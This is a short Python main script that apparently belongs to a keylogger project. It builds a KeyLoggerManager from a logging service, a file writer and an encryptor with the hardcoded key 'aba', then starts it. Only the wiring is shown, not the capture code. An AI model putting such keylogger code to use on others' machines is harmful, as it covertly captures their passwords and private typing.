from Agent.encryptor import Encryptor
from Agent.key_logger_manager import KeyLoggerManager
from Agent.key_logger_service import KeyLoggerService
from Agent.file_writer import FileWriter

if __name__ == '__main__':
    key_logger_manager = KeyLoggerManager(
        service=KeyLoggerService(),
        writer=FileWriter(),
        encryptor=Encryptor("aba"),
    )

    key_logger_manager.start()



